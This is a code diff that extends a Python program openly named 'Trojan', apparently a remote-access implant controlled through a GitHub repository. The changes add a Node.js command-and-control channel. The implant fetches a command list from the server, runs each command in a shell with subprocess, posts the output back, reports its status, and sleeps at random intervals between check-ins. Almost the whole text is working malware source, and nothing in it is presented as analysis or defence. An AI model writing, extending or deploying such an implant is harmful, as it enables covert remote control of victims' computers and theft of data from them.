@@ -6,6 +6,8 @@ import random
 import sys
 import threading
 import time
+import subprocess
+import requests
 from datetime import datetime
 
 def github_connect():
@@ -19,19 +21,53 @@ def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
-    def __init__(self, id):
+    def __init__(self, id, node_server_url):
         self.id = id
         self.config_file = f'{id}.json'
-        self.data_path = f'data/{id}/'
+        self.data_path = f'data/{self.id}/'
         self.repo = github_connect()
+        self.node_server_url = node_server_url
+        self.running = True
 
-    def get_config(self):
+    def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
-        config = json.loads(base64.b64decode(config_json))
-        for task in config:
-            if task['module'] not in sys.modules:
-                exec("import %s" % task['module'])
-        return config
+        return json.loads(base64.b64decode(config_json))
+
+    def get_nodejs_config(self):
+        try:
+            response = requests.get(f"{self.node_server_url}/config")
+            return response.json()
+        except requests.exceptions.RequestException as e:
+            print(f"[*] Failed to get config from Node.js server: {e}")
+            return None
+
+    def send_command_result(self, command, result):
+        try:
+            payload = {
+                "command": command,
+                "result": result
+            }
+            requests.post(f"{self.node_server_url}/command", json=payload)
+        except requests.exceptions.RequestException as e:
+            print(f"[*] Failed to send command result to Node.js server: {e}")
+
+    def update_status(self, status):
+        try:
+            payload = {
+                "id": self.id,
+                "status": status
+            }
+            requests.post(f"{self.node_server_url}/status", json=payload)
+        except requests.exceptions.RequestException as e:
+            print(f"[*] Failed to update status on Node.js server: {e}")
+
+    def execute_command(self, command):
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            result = result.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            result = e.output.decode('utf-8')
+        self.send_command_result(command, result)
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -44,12 +80,29 @@ class Trojan:
         self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
-        while True:
-            config = self.get_config()
-            for task in config:
+        while self.running:
+            # Fetch configuration from GitHub
+            github_config = self.get_github_config()
+
+            # Fetch real-time commands from Node.js server
+            nodejs_config = self.get_nodejs_config()
+
+            if nodejs_config:
+                if nodejs_config.get('stop'):
+                    self.running = False
+                    self.update_status("Trojan stopped.")
+                    break
+
+                # Execute commands from Node.js server
+                for command in nodejs_config.get('commands', []):
+                    self.execute_command(command)
+
+            # Run modules based on GitHub config
+            for task in github_config.get('modules', []):
                 thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
+
             time.sleep(random.randint(30*60, 3*60*60))
 
 class GitImporter:
@@ -76,5 +129,7 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    trojan = Trojan('abc')
+    NODE_SERVER_URL = "<http://localhost:3000>"  # Change this to your Node.js server URL
+    trojan = Trojan('abc', NODE_SERVER_URL)
     trojan.run()
+
